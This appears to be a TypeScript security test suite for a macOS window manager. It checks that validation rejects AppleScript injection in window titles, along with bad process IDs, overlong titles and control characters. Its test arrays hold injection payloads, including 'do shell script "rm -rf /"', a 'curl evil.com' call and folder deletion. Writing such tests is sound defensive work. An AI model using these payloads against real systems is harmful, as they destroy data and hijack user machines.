import { describe, it, beforeEach } from 'node:test'
import assert from 'node:assert'
import { MacOSWindowManager } from '../../services/window-manager/macos-manager.js'
import { WindowInfo } from '../../services/window-manager/types.js'

describe('macOS Security Tests', () => {
    let windowManager: MacOSWindowManager

    beforeEach(() => {
        windowManager = new MacOSWindowManager()
    })

    describe('Input Validation', () => {
        it('should reject malicious window titles', async () => {
            const maliciousTitles = [
                'normal"; do shell script "rm -rf /"; tell application "',
                'test\'; tell application "System Events" to quit every process',
                'window"; run script "evil code"; tell app "',
                'title containing tell application SystemEvents to delete',
                'x'.repeat(1000), // Too long
                'title\nwith\nnewlines',
                'title with\ttabs',
                'title\rwith\rcarriage\rreturns'
            ]

            for (const title of maliciousTitles) {
                const maliciousWindow: WindowInfo = {
                    id: 1234,
                    title,
                    processId: 1234,
                    bounds: { x: 0, y: 0, width: 100, height: 100 }
                }

                try {
                    await windowManager.focusWindow(maliciousWindow)
                    assert.fail(`Should have rejected malicious title: ${title.substring(0, 50)}...`)
                } catch (error) {
                    assert(error instanceof Error)
                    assert(error.message.includes('invalid') || 
                          error.message.includes('forbidden') || 
                          error.message.includes('dangerous') ||
                          error.message.includes('exceeds'))
                }
            }
        })

        it('should reject invalid process IDs', async () => {
            const invalidProcessIds = [
                -1,
                0,
                999999999, // Too large
                NaN,
                Infinity,
                1.5 // Not integer
            ]

            for (const processId of invalidProcessIds) {
                const invalidWindow: WindowInfo = {
                    id: processId,
                    title: 'Valid Title',
                    processId,
                    bounds: { x: 0, y: 0, width: 100, height: 100 }
                }

                try {
                    await windowManager.focusWindow(invalidWindow)
                    assert.fail(`Should have rejected invalid process ID: ${processId}`)
                } catch (error) {
                    assert(error instanceof Error)
                    assert(error.message.includes('Invalid process ID'))
                }
            }
        })

        it('should sanitize valid titles properly', async () => {
            const validTitles = [
                'Normal Window Title',
                'File - Project.txt',
                'Browser (Tab 1)',
                'App [Document]',
                'Terminal: ~/workspace',
                'Editor | file.js',
                'Calculator: 2+2=4'
            ]

            // These should not throw errors (though they may fail to find actual windows)
            for (const title of validTitles) {
                const validWindow: WindowInfo = {
                    id: 1234,
                    title,
                    processId: 1234,
                    bounds: { x: 0, y: 0, width: 100, height: 100 }
                }

                try {
                    // This may fail due to window not existing, but should not fail validation
                    await windowManager.focusWindow(validWindow)
                } catch (error) {
                    // Should fail with window-related errors, not validation errors
                    assert(error instanceof Error)
                    assert(!error.message.includes('invalid'))
                    assert(!error.message.includes('forbidden'))
                    assert(!error.message.includes('dangerous'))
                }
            }
        })
    })

    describe('AppleScript Injection Prevention', () => {
        it('should prevent script injection in window operations', async () => {
            const injectionAttempts = [
                'window"; do shell script "curl evil.com"; tell app "',
                'title\'; run script (load script file "evil.scpt"); tell application "',
                'normal"; quit every application; tell app "',
                'test"; system events to delete folder "Documents"; tell app "'
            ]

            for (const maliciousTitle of injectionAttempts) {
                const maliciousWindow: WindowInfo = {
                    id: 1234,
                    title: maliciousTitle,
                    processId: 1234,
                    bounds: { x: 0, y: 0, width: 100, height: 100 }
                }

                // All operations should be blocked
                const operations = [
                    () => windowManager.focusWindow(maliciousWindow),
                    () => windowManager.closeWindow(maliciousWindow)
                ]

                for (const operation of operations) {
                    try {
                        await operation()
                        assert.fail(`Should have blocked injection attempt: ${maliciousTitle}`)
                    } catch (error) {
                        assert(error instanceof Error)
                        // Should fail with security-related error
                        assert(error.message.includes('forbidden') || 
                              error.message.includes('dangerous') ||
                              error.message.includes('invalid'))
                    }
                }
            }
        })

        it('should prevent command chaining in AppleScript', async () => {
            const chainAttempts = [
                'window"; tell application "Terminal" to do script "rm -rf /"; tell app "',
                'title"; system events to keystroke "dangerous"; tell app "',
                'normal"; activate application "Calculator"; quit application "Finder"; tell app "'
            ]

            for (const chainTitle of chainAttempts) {
                const chainWindow: WindowInfo = {
                    id: 1234,
                    title: chainTitle,
                    processId: 1234,
                    bounds: { x: 0, y: 0, width: 100, height: 100 }
                }

                try {
                    await windowManager.focusWindow(chainWindow)
                    assert.fail(`Should have prevented command chaining: ${chainTitle}`)
                } catch (error) {
                    assert(error instanceof Error)
                    assert(error.message.includes('forbidden') || 
                          error.message.includes('dangerous'))
                }
            }
        })
    })

    describe('Resource Limits', () => {
        it('should enforce maximum title length', async () => {
            const longTitle = 'x'.repeat(1001) // Exceeds limit
            const longTitleWindow: WindowInfo = {
                id: 1234,
                title: longTitle,
                processId: 1234,
                bounds: { x: 0, y: 0, width: 100, height: 100 }
            }

            try {
                await windowManager.focusWindow(longTitleWindow)
                assert.fail('Should have rejected overly long title')
            } catch (error) {
                assert(error instanceof Error)
                assert(error.message.includes('exceeds maximum length'))
            }
        })

        it('should enforce process ID limits', async () => {
            const highProcessId = 9999999 // Exceeds limit
            const highPidWindow: WindowInfo = {
                id: highProcessId,
                title: 'Normal Title',
                processId: highProcessId,
                bounds: { x: 0, y: 0, width: 100, height: 100 }
            }

            try {
                await windowManager.focusWindow(highPidWindow)
                assert.fail('Should have rejected high process ID')
            } catch (error) {
                assert(error instanceof Error)
                assert(error.message.includes('Invalid process ID'))
            }
        })
    })

    describe('Character Encoding Security', () => {
        it('should handle Unicode safely', async () => {
            const unicodeTitles = [
                'Normal Title with émojis 🔒',
                'Unicode characters: αβγδε',
                'Mixed: normal + ñice + 中文',
            ]

            for (const title of unicodeTitles) {
                const unicodeWindow: WindowInfo = {
                    id: 1234,
                    title,
                    processId: 1234,
                    bounds: { x: 0, y: 0, width: 100, height: 100 }
                }

                try {
                    await windowManager.focusWindow(unicodeWindow)
                } catch (error) {
                    // May fail due to window not existing, but should handle Unicode safely
                    assert(error instanceof Error)
                    // Should not fail with character encoding errors
                    assert(!error.message.includes('encoding'))
                    assert(!error.message.includes('character'))
                }
            }
        })

        it('should reject control characters', async () => {
            const controlCharTitles = [
                'Title with\x00null',
                'Title with\x01control',
                'Title with\x1Bescape'
            ]

            for (const title of controlCharTitles) {
                const controlWindow: WindowInfo = {
                    id: 1234,
                    title,
                    processId: 1234,
                    bounds: { x: 0, y: 0, width: 100, height: 100 }
                }

                try {
                    await windowManager.focusWindow(controlWindow)
                    assert.fail(`Should have rejected control characters: ${title}`)
                } catch (error) {
                    assert(error instanceof Error)
                    assert(error.message.includes('invalid characters'))
                }
            }
        })
    })

    describe('Error Information Leakage', () => {
        it('should not leak sensitive information in error messages', async () => {
            const sensitiveTitle = 'containing password123 and secret_key'
            const sensitiveWindow: WindowInfo = {
                id: -1, // Invalid to trigger error
                title: sensitiveTitle,
                processId: -1,
                bounds: { x: 0, y: 0, width: 100, height: 100 }
            }

            try {
                await windowManager.focusWindow(sensitiveWindow)
                assert.fail('Should have failed validation')
            } catch (error) {
                assert(error instanceof Error)
                // Error message should not contain the sensitive title
                assert(!error.message.includes('password123'))
                assert(!error.message.includes('secret_key'))
            }
        })
    })
}) 